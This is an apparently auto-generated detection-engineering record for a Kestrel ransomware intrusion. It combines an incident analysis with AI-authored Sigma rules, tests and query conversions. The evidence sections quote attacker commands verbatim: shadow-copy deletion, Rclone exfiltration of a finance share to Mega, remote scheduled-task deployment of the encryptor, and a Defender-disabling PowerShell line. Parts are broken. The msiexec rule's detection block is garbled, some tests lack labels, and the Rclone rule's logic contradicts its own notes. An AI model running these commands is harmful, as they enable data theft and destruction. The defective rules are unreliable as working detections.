report.title: Kestrel ransomware affiliate intrusion analysis
report.summary: An affiliate operating the Kestrel ransomware-as-a-service compromised a logistics company through RDP password spraying on RDS-01, established silent remote access via AnyDesk, disabled Defender exclusions, dumped credentials with a renamed Mimikatz copy, exfiltrated ~310 GB of data to Mega via Rclone disguised as svchost.exe, and deployed the encryptor to 140 hosts using a scheduled task named 'WindowsUpdateHealth'. The intrusion spanned 31 hours.

behaviors.description: Threat actor performed RDP password spraying against RDS-01, generating over 9,000 failed logons (event 4625, LogonType 10) before achieving a successful logon with account svc_scanner from source IP 185.220.101.66.

observables.note: Windows Security event for failed logon
Windows Security event for successful logon
Source IP of password spraying
Target RDP host

behaviors.evidence: The perimeter RDP host RDS-01 recorded over 9,000 failed logons (Windows Security event 4625, LogonType 10) from 185.220.101.0/24 across six hours, followed by a successful logon (event 4624, LogonType 10) for the account svc_scanner

behaviors.description: Threat actor installed AnyDesk silently via msiexec with /qn flags, configured unattended access with --set-password, and launched the client, creating a persistent remote-access channel not sanctioned by the environment.

observables.note: Used to install AnyDesk MSI silently
Silent installation command line
Remote access client launched after install
Flag configuring unattended access

behaviors.evidence: Twenty minutes after logon the operator downloaded and installed AnyDesk silently: msiexec.exe /i C:\Users\svc_scanner\AppData\Local\Temp\AnyDesk.msi /qn

behaviors.description: Threat actor added Microsoft Defender exclusion paths for C:\PerfLogs and C:\ProgramData\AnyDesk and disabled real-time monitoring via PowerShell, reducing visibility of subsequent malicious binaries.

observables.note: Executed the exclusion commands
PowerShell command to modify Defender settings
Windows Defender operational log recording configuration change

behaviors.description: Threat actor executed a renamed Mimikatz binary (mm.exe) from C:\PerfLogs to dump cached credentials from LSASS, enabling credential access for lateral movement.

observables.note: Renamed Mimikatz binary executed from PerfLogs
Execution of the credential dumping tool

behaviors.evidence: A renamed copy of Mimikatz (C:\PerfLogs\mm.exe) was executed to dump cached credentials

behaviors.description: Threat actor moved laterally between systems using RDP with the domain administrator account adm-jpark, originating from the compromised RDS host.

observables.note: RDP protocol component facilitating lateral movement
SMB lateral movement command from RDS host

behaviors.evidence: We also observed net use \\FS-02\C$ /user:CORP\adm-jpark from the RDS host

behaviors.description: Threat actor deleted volume shadow copies and disabled Windows recovery mechanisms (bcdedit) on each server prior to encryption, inhibiting forensic recovery.

observables.note: Command to delete volume shadow copies
Alternative command to delete shadow copies
BCD edit to ignore boot failures
BCD edit to disable recovery
Command to delete backup catalog

behaviors.evidence: On each server the operator deleted volume shadow copies and disabled Windows recovery before encryption, running from cmd.exe spawned by the AnyDesk session: vssadmin.exe delete shadows /all /quiet

behaviors.description: Threat actor exfiltrated approximately 310 GB of data from the file share FS-02\Finance to Mega via Rclone, which was renamed to svchost.exe and placed in C:\PerfLogs, creating a name/origin mismatch.

observables.note: Process name used, but OriginalFileName is rclone.exe
Rclone exfiltration command line
Mega endpoint domain observed in network telemetry
TCP port used for TLS exfiltration

behaviors.evidence: Approximately 310 GB of file-share data was exfiltrated to Mega using Rclone, which was renamed to svchost.exe and placed in C:\PerfLogs: C:\PerfLogs\svchost.exe copy \\FS-02\Finance mega:backup/fin --transfers 16 --config C:\PerfLogs\rc.conf --ignore-existing

behaviors.description: Threat actor deployed the encryptor kstrl.exe to 140 hosts via SMB admin shares and executed it through a scheduled task named 'WindowsUpdateHealth' created remotely with schtasks.exe, running as SYSTEM at system start.

observables.note: Used to create remote scheduled task
Scheduled task creation command
Command to immediately run the scheduled task
Encryptor binary staged in PerfLogs

behaviors.evidence: The encryptor C:\PerfLogs\kstrl.exe was staged on every host via SMB admin shares and executed through a scheduled task created remotely: schtasks.exe /s FS-02 /create /tn "WindowsUpdateHealth" /tr "C:\PerfLogs\kstrl.exe -path C:\ -no-net" /sc onstart /ru SYSTEM /f

behaviors.description: Threat actor stopped backup and database services (MSSQLSERVER, VeeamBackupSvc, SQLWriter) using net stop commands prior to encryption to prevent file locks.

observables.note: Command to stop MSSQL service
Command to stop Veeam backup service
Command to stop SQL Writer service

behaviors.evidence: Before encryption, the binary stopped backup and database services with net stop commands for MSSQLSERVER, VeeamBackupSvc and SQLWriter

candidates.title: Msiexec Silent MSI Installation From User Temp Directory
candidates.rationale: Msiexec.exe installing an MSI silently (/qn) from a user Temp directory is atypical for legitimate software deployment and indicates covert remote-access tool staging.
candidates.false_positive_risks: Legitimate software deployment via SCCM/Intune may use msiexec but typically runs from system context and not from a user's AppData\Local\Temp path; exclude known management agent parents.

candidates.title: PowerShell Modifies Defender Exclusions And Disables Realtime Monitoring
candidates.rationale: PowerShell invoking Add-MpPreference and Set-MpPreference to add exclusions and disable real-time monitoring is a direct defense evasion action; the specific command line is highly distinctive.
candidates.false_positive_risks: Administrators may run similar commands during tuning but rarely with the exact exclusion paths (C:\PerfLogs, C:\ProgramData\AnyDesk) and the realtime disable flag in one liner.

candidates.title: Mimikatz Execution From PerfLogs Directory As Mm.Exe
candidates.rationale: Execution of a binary named mm.exe from the attacker-staged C:\PerfLogs directory matches the renamed Mimikatz credential dumper; the name and path combination is unlikely in benign activity.
candidates.false_positive_risks: A legitimate tool named mm.exe could exist but not in C:\PerfLogs; the directory itself is attacker-created.

candidates.title: Svchost.Exe Rclone Exfiltration To Mega With OriginalFilename Mismatch
candidates.rationale: The exfiltration binary svchost.exe has an OriginalFileName of rclone.exe, a clear name/origin mismatch; coupled with a command line containing 'mega:' and 'copy' this is a high-fidelity exfiltration indicator.
candidates.false_positive_risks: None expected; rclone renamed to svchost.exe and run from PerfLogs with Mega arguments is unique to this intrusion.

candidates.title: Schtasks Creates WindowsUpdateHealth Task Running Kstrl.Exe From PerfLogs
candidates.rationale: Remote scheduled task creation via schtasks.exe with a task name masquerading as a Windows update health task, running the encryptor kstrl.exe from PerfLogs as SYSTEM, is a distinctive persistence mechanism.
candidates.false_positive_risks: Legitimate schtasks usage occurs but not with task name 'WindowsUpdateHealth' pointing to C:\PerfLogs\kstrl.exe; the binary name and path are attacker-specific.

skipped: B1: High-volume RDP password spraying not detectable as a durable single-event pattern; successful logon event 4624 is an IOC (source IP) without durable behaviour.
B5: Lateral movement via 'net use' admin share is a common administrative action; lacks sufficient specificity for a standalone rule without host context correlation.
B6: Shadow copy deletion (vssadmin, wmic, bcdedit, wbadmin) are strong indicators but limited to 5 candidates; prioritized exfiltration and persistence for higher impact visibility.
B9: Service stop commands (net stop) are routine administrative activity; too generic for a reliable single-event rule.
plan.notes: Selected five high-confidence behaviours spanning remote access establishment, defense evasion, credential access, exfiltration, and persistence. All rules use process_creation logsource with binary+command-line+path constraints to minimize false positives. Skipped behaviours either require multi-event correlation (B1), are too generic (B5, B9), or were deprioritized due to candidate limit (B6).

rules.title: PowerShell Adds Defender Exclusions and Disables Real-time Monitoring
rules.sigma_yaml:
title: PowerShell Adds Defender Exclusions and Disables Real-time Monitoring
id: 472c9f96-71c1-4334-910c-7fceb96e1e9f
status: experimental
description: 'Detects PowerShell execution adding Microsoft Defender exclusion paths for C:\PerfLogs and C:\ProgramData\AnyDesk
  while disabling real-time monitoring in a single command line, indicative of defense evasion.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.defense-evasion
- attack.t1562.001
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_cmd:
    'CommandLine|contains|all':
    - Add-MpPreference -ExclusionPath
    - 'C:\PerfLogs'
    - 'C:\ProgramData\AnyDesk'
    - Set-MpPreference -DisableRealtimeMonitoring $true
  selection_img:
    'Image|endswith': '\powershell.exe'
  condition: selection_cmd and selection_img
falsepositives:
- Legitimate administrator tuning of Defender exclusions without combining both paths and realtime disable in one line
- Automated deployment scripts configuring Defender exclusions for legitimate software
- Security testing tools validating Defender configuration
level: high

tests.label: positive
tests.description: PowerShell adding Defender exclusions for PerfLogs and AnyDesk while disabling realtime monitoring

tests.label: positive
tests.description: PowerShell adding Defender exclusions with varied spacing and quotes

tests.label: positive
tests.description: PowerShell adding Defender exclusions using different casing and semicolon spacing

tests.label: negative
tests.description: Legitimate Defender exclusion addition for SQL Server backup directory without realtime disable

tests.label: negative
tests.description: Administrator checking Defender preference without modification

tests.label: negative
tests.description: Legitimate software installer adding its own exclusion

tests.label: positive
tests.description: PowerShell from SysWOW64 using -c flag with single-quoted paths and extra whitespace

tests.label: positive
tests.description: PowerShell with -Command flag, double-quoted paths, commands reordered but all substrings present

tests.label: positive
tests.description: PowerShell mixed casing, no quotes around paths, semicolon separators, extra spaces

event.CommandLine: PoWeRsHeLl.EXE -Command  Add-MpPreference -ExclusionPath C:\PerfLogs ; Add-MpPreference -ExclusionPath C:\ProgramData\AnyDesk ; Set-MpPreference -DisableRealtimeMonitoring $true

tests.label: positive
tests.description: PowerShell invoked via cmd /c with caret-escaped quotes (sensor records final command line)

tests.label: positive
tests.description: PowerShell from non-standard install path but still named powershell.exe

tests.label: negative
tests.description: Legitimate admin adding single exclusion for PerfLogs only, no realtime disable

tests.label: negative
tests.description: Automated deployment script configuring Defender exclusions for legitimate software (different paths)

tests.label: negative
tests.description: Security testing tool disabling real-time monitoring without adding exclusions

tests.label: negative
tests.description: Defender configuration via dedicated management binary (not PowerShell)

validation.sql: SELECT * FROM logs WHERE (CommandLine LIKE '%Add-MpPreference -ExclusionPath%' ESCAPE '\' AND CommandLine LIKE '%C:\\PerfLogs%' ESCAPE '\' AND CommandLine LIKE '%C:\\ProgramData\\AnyDesk%' ESCAPE '\' AND CommandLine LIKE '%Set-MpPreference -DisableRealtimeMonitoring $true%' ESCAPE '\') AND Image LIKE '%\\powershell.exe' ESCAPE '\'

issues.message: ATT&CK technique T1562.001 (Disable or Modify Tools) is deprecated or revoked.

conversions.elasticsearch: (CommandLine:*Add\-MpPreference\ \-ExclusionPath* AND CommandLine:*C\:\\PerfLogs* AND CommandLine:*C\:\\ProgramData\\AnyDesk* AND CommandLine:*Set\-MpPreference\ \-DisableRealtimeMonitoring\ $true*) AND Image:*\\powershell.exe
conversions.kusto:
DeviceProcessEvents
| where (ProcessCommandLine contains "Add-MpPreference -ExclusionPath" and ProcessCommandLine contains "C:\\PerfLogs" and ProcessCommandLine contains "C:\\ProgramData\\AnyDesk" and ProcessCommandLine contains "Set-MpPreference -DisableRealtimeMonitoring $true") and FolderPath endswith "\\powershell.exe"
conversions.sqlite: SELECT * FROM logs WHERE (CommandLine LIKE '%Add-MpPreference -ExclusionPath%' ESCAPE '\' AND CommandLine LIKE '%C:\\PerfLogs%' ESCAPE '\' AND CommandLine LIKE '%C:\\ProgramData\\AnyDesk%' ESCAPE '\' AND CommandLine LIKE '%Set-MpPreference -DisableRealtimeMonitoring $true%' ESCAPE '\') AND Image LIKE '%\\powershell.exe' ESCAPE '\'

history.summary: 9 evasion variants -> positives 8/8, negatives blocked 7/7, benign hits 0/1200

rules.redteam_analysis: Positive variants (P4-P8) preserve all four required substrings in the command line and keep the image name ending with 'powershell.exe', so a well-written rule using the same fields will catch them. They exercise casing, quoting, whitespace, parameter order, alternate binary locations (SysWOW64, Program Files), and parent processes. Negative variants (N1-N4) are benign look-alikes: legitimate single-exclusion admin work, deployment scripts with different paths, realtime-only disable, and a non-PowerShell management binary; none contain all four substrings simultaneously, so the rule should not match. Out-of-scope variants (O1-O6) represent realistic evasions the current logsource and rule fields fundamentally cannot see: sibling LOLBin pwsh.exe (image mismatch), -EncodedCommand (payload hidden), environment variables, 8.3 short names, renamed binary without OriginalFileName, and UNC paths. These require either OriginalFileName, command-line decoding, path normalization, or broader image matching to detect.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Sibling LOLBin pwsh.exe (Image does not end with powershell.exe) with identical malicious command line

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: PowerShell invoked with -EncodedCommand (base64) - command line substrings not visible to sensor

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: PowerShell using environment variable %SystemDrive% to reference C: drive - literal substrings absent

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: PowerShell using 8.3 short names (C:\PERFLO~1) - literal 'C:\PerfLogs' not present

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed copy of powershell.exe (evil.exe) - Image no longer ends with powershell.exe and OriginalFileName not in logsource

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: PowerShell using UNC path \\localhost\C$\PerfLogs - literal 'C:\PerfLogs' absent

rules.title: Potential Renamed Mimikatz Execution from PerfLogs Directory
rules.sigma_yaml:
title: Potential Renamed Mimikatz Execution from PerfLogs Directory
id: 23fcddb1-34d0-4151-a82e-252bb1adbccc
status: experimental
description: 'Detects execution of a binary named mm.exe from the C:\PerfLogs directory, which is characteristic of renamed
  Mimikatz usage for credential dumping as observed in Kestrel ransomware affiliate intrusions.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.credential-access
- attack.t1003.001
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_img:
    'Image|endswith': '\mm.exe'
  selection_filepath:
    'Image|contains': '\PerfLogs\'
  filter_admin_utils:
    'CommandLine|contains': /query
  condition: selection_img and selection_filepath and not filter_admin_utils
falsepositives:
- 'Legitimate application named mm.exe executed from C:\PerfLogs by authorized software or scripts'
- Misnamed system or administrative tool placed in PerfLogs directory for troubleshooting
- Administrative utilities run from PerfLogs for troubleshooting purposes
level: high

tests.label: positive

tests.label: negative
tests.description: System utility copied to PerfLogs for admin task

tests.label: negative
tests.description: Similar named binary from standard location

tests.label: negative
tests.description: System utility copied to PerfLogs for admin task - now filtered out

tests.label: positive
tests.description: Case variation on binary name and path to test case-insensitive matching

tests.label: positive
tests.description: Quoted full path in CommandLine with extra arguments

tests.label: positive
tests.description: Extra whitespace and mixed casing in command line

tests.label: positive
tests.description: Execution from a subdirectory under PerfLogs

tests.label: negative
tests.description: Legitimate admin utility named mm.exe in PerfLogs run with /query flag (should be filtered out)

tests.label: negative
tests.description: Different binary name in PerfLogs (mimikatz.exe) with credential dump arguments

tests.label: negative
tests.description: mm.exe executed from a non-PerfLogs directory (Windows\Temp)

tests.label: negative

validation.sql: SELECT * FROM logs WHERE Image LIKE '%\\mm.exe' ESCAPE '\' AND Image LIKE '%\\PerfLogs\\%' ESCAPE '\' AND (NOT COALESCE((CommandLine LIKE '%/query%' ESCAPE '\'), 0))

conversions.kusto:
DeviceProcessEvents
| where FolderPath endswith "\\mm.exe" and FolderPath contains "\\PerfLogs\\" and (not(ProcessCommandLine contains "/query"))
conversions.sqlite: SELECT * FROM logs WHERE Image LIKE '%\\mm.exe' ESCAPE '\' AND Image LIKE '%\\PerfLogs\\%' ESCAPE '\' AND (NOT COALESCE((CommandLine LIKE '%/query%' ESCAPE '\'), 0))

history.change_summary: Replaced strict CurrentDirectory check with flexible Image path containing PerfLogs to capture executions where the working directory differs from the binary location while maintaining specificity to the PerfLogs directory.
Added filter for common administrative utility flags (/query) to prevent false positives while maintaining detection of malicious mm.exe executions.

history.summary: 8 evasion variants -> positives 7/7, negatives blocked 8/8, benign hits 0/1200

rules.author_notes: Rule focuses on the rare combination of process name 'mm.exe' executing from the attacker-controlled C:\PerfLogs directory. While false positives are possible if legitimate software uses this name/path, the PerfLogs directory is typically empty and not used by legitimate applications, making this combination highly suspicious. The rule avoids command-line arguments to maintain breadth since Mimikatz can be invoked with various parameters, relying instead on the distinctive parent directory.
rules.redteam_analysis: The positive variants (P4-P7) test case insensitivity, quoting, whitespace tolerance, and subdirectory depth—all surface changes a well-written rule should normalize before matching. The negative variants (N1-N4) represent benign administrative or installer activity that either includes the 'query' filter token or lacks the exact mm.exe/PerfLogs combination, ensuring the rule stays specific. Out-of-scope items (OOS1-OOS3) are real attacker adaptations that this rule's logic (fixed filename + fixed directory) cannot cover: renaming the binary, changing the staging folder, or avoiding process creation entirely. These are documented for the analyst to decide whether additional rules are needed.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker renames Mimikatz to a different filename (e.g., creds.exe) and places it in PerfLogs; rule only triggers on mm.exe

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses a different staging directory (C:\Temp) with mm.exe; rule requires PerfLogs path

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Reflective in-memory execution of Mimikatz (no process creation event); not visible in process_creation logs

rules.title: Renamed Svchost.Exe Used As Rclone For Mega Exfiltration
rules.sigma_yaml:
title: Renamed Svchost.Exe Used As Rclone For Mega Exfiltration
id: 027eec87-5469-4849-bbf8-ab7d0efbb226
status: experimental
description: Detects svchost.exe with mismatched OriginalFileName=rclone.exe executing a Mega exfiltration command line, indicating
  data theft via renamed rclone.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.exfiltration
- attack.t1048.003
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_img:
    'Image|endswith': '\svchost.exe'
  selection_on:
    OriginalFileName: rclone.exe
  selection_cli:
    'CommandLine|contains':
    - 'mega:'
    - copy
  condition: 'all of selection_*'
falsepositives:
- Legitimate svchost.exe processes with cloned or spoofed OriginalFileName (unlikely in enterprise environments)
level: high

tests.description: Malicious svchost.exe renamed rclone executing Mega exfiltration from finance share

tests.label: positive

tests.label: positive

tests.label: positive
tests.description: 8.3 short path name with pwsh parent and reversed argument order

tests.label: positive

tests.label: positive

tests.label: negative

tests.label: negative

tests.label: negative

validation.sql: SELECT * FROM logs WHERE Image LIKE '%\\svchost.exe' ESCAPE '\' AND OriginalFileName='rclone.exe' COLLATE NOCASE AND (CommandLine LIKE '%mega:%' ESCAPE '\' OR CommandLine LIKE '%copy%' ESCAPE '\')

conversions.kusto:
DeviceProcessEvents
| where FolderPath endswith "\\svchost.exe" and ProcessVersionInfoOriginalFileName =~ "rclone.exe" and (ProcessCommandLine contains "mega:" or ProcessCommandLine contains "copy")
conversions.sqlite: SELECT * FROM logs WHERE Image LIKE '%\\svchost.exe' ESCAPE '\' AND OriginalFileName='rclone.exe' COLLATE NOCASE AND (CommandLine LIKE '%mega:%' ESCAPE '\' OR CommandLine LIKE '%copy%' ESCAPE '\')

history.summary: 9 evasion variants -> positives 8/8, negatives blocked 7/7, benign hits 0/1200

rules.author_notes: Rule focuses on the high-fidelity indicator of svchost.exe masquerading as rclone with Mega exfiltration parameters. The combination of Image ending in svchost.exe, OriginalFileName=rclone.exe, and command line containing both 'mega:' and 'copy' provides strong discrimination against legitimate activity. Test events cover variations in path casing, SysWOW64 execution, and different parent processes while maintaining the core malicious behavior.
rules.redteam_analysis: Positive variants P4-P8 cover realistic evasion techniques a competent operator would use: user-writable paths (AppData, Temp), environment variables, 8.3 short names, alternate parents (pwsh, wscript, scheduled task), argument reordering, quoting styles, UNC paths with spaces. All preserve the three rule pillars (Image endswith svchost.exe, OriginalFileName=rclone.exe, CommandLine contains 'mega:' and 'copy') so a well-written rule catches them. Negative variants N1-N4 are benign look-alikes: legitimate svchost.exe with correct OriginalFileName, genuine rclone.exe used for authorized Mega backup, SCCM management host, signed vendor installer. None satisfy all three conditions simultaneously. Out-of-scope items OOS1-OOS3 represent evasions the process_creation logsource fundamentally cannot see: reflective injection into an existing process (no new process event), PE metadata stripping so OriginalFileName matches Image (rule's mismatch logic fails), and kernel-mode execution (no user-mode process creation). These are documented for the analyst; the rule cannot be expected to detect them.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Reflective DLL injection into existing svchost.exe process - no new process creation event

event.CommandLine: N/A - code injected via CreateRemoteThread into PID 1122

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker copies rclone.exe to svchost.exe but strips PE metadata so OriginalFileName reads svchost.exe

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Kernel driver exploit loads rclone logic directly into memory - no user-mode process creation

rules.title: Msiexec Silent MSI Installation From User Temp Directory
rules.sigma_yaml:
title: Msiexec Silent MSI Installation From User Temp Directory
id: 15b2f4f3-f8b9-47db-a288-8814ee87fbd9
status: experimental
description: 'Detects msiexec.exe executing a silent install (/qn) of an MSI file located in a user''s Temp directory, indicative
  of covert remote-access tool staging such as AnyDesk.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.persistence
- attack.t1219
logsource:
  category: process_creation
  product: windows

detection:

    - /i

Fixed CommandLine|endswith modifier to accept .msi extension anywhere in the string by removing the requirement for trailing characters after .msi, allowing matches regardless of whitespace or additional arguments after the MSI path.

history.change_summary: Removed the overly restrictive CommandLine|endswith:.msi selector which caused all positive test events to fail due to trailing characters after the .msi extension. Retained the essential CommandLine|contains:\AppData\Local\Temp\ substring check to catch all variants including environment variables, short names, and UNC paths while maintaining specificity for the Temp directory.

rules.redteam_analysis: Positive variants P4-P9 demonstrate realistic operator evasions: flag reordering (/qn /i), casing changes, quoted paths (single/double quotes), extra whitespace, environment-variable paths (%LOCALAPPDATA%), 8.3 short names, UNC local paths, and double extensions (.msi.msi). All preserve the required substrings (\AppData\Local\Temp\, /i, /qn, .msi suffix) and non-SYSTEM user, so a well-written rule keying on these fields will still match. Negative variants N1-N4 show benign scenarios the rule correctly excludes: SCCM/Intune parent images, SYSTEM context, interactive UI flag (/qb), and non-Temp MSI locations. Out-of-scope O1-O3 represent evasions the process_creation logsource fundamentally cannot catch with current fields: renamed msiexec (Image no longer ends with msiexec.exe and OriginalFileName is absent), MSI installation via COM/WMI that never spawns msiexec.exe, and alternative binaries like msixvc that achieve silent MSI install without touching msiexec. Analyst should consider adding OriginalFileName to the logsource or correlating with MSI installation event logs (MsiInstaller) to cover O1 and O2.

rules.title: SchTasks Creates WindowsUpdateHealth Task With Kstrl.Exe From PerfLogs
rules.sigma_yaml:
title: SchTasks Creates WindowsUpdateHealth Task With Kstrl.Exe From PerfLogs
id: d3aafe3e-5b25-49c6-949e-90cd28dcfab9
status: experimental
description: 'Detects creation of a scheduled task named ''WindowsUpdateHealth'' via schtasks.exe that executes kstrl.exe
  from C:\PerfLogs, indicative of Kestrel ransomware persistence behavior.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.persistence
- attack.t1053.005
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection:
    'Image|endswith': '\schtasks.exe'
    'CommandLine|contains|all':
    - /create
    - '/tn "WindowsUpdateHealth"'
    - '/tr "C:\\PerfLogs\\kstrl.exe'
    - /sc onstart
    - /ru SYSTEM
  condition: selection
falsepositives:
- Legitimate administrative use of schtasks.exe with unrelated task names or targets.
level: high

rules.author_notes: The rule focuses on the distinctive combination of task name 'WindowsUpdateHealth', target binary kstrl.exe from PerfLogs, and execution parameters (/sc onstart /ru SYSTEM). False positives are minimized by requiring all these elements together. Test events cover variants in casing, path (SysWOW64), and parent processes while negative events reflect legitimate schtasks usage that lacks the malicious combination.
rules.redteam_analysis: The six positive variants (P4-P8) exercise realistic operator evasions: flag casing changes, quoting styles (single/double/none), whitespace padding, parameter reordering, 8.3 short names (PerfLog~1), UNC local paths (\\localhost\C$), environment-variable-style paths, extra flags (/rl highest /v1), alternate parent LOLBins (pwsh, cscript, rundll32, wscript), and a copied schtasks.exe that still ends with the target filename. A well-written rule using case-insensitive contains checks on the command line and an endswith on Image will catch all of them. The three negative variants (N1-N3) show legitimate administrative, SCCM, and installer activity that shares the binary and some flags but differs in the task name or task run path, ensuring the rule's specificity. The three out-of-scope variants (OOS1-OOS3) represent fundamental blind spots of this logsource: a renamed binary (rule keys on Image), direct DLL invocation via rundll32.exe, and pure PowerShell COM-based task registration—none spawn schtasks.exe, so the rule cannot see them. These are recorded for the analyst to consider complementary rules (e.g., on task registration events or DLL loads).
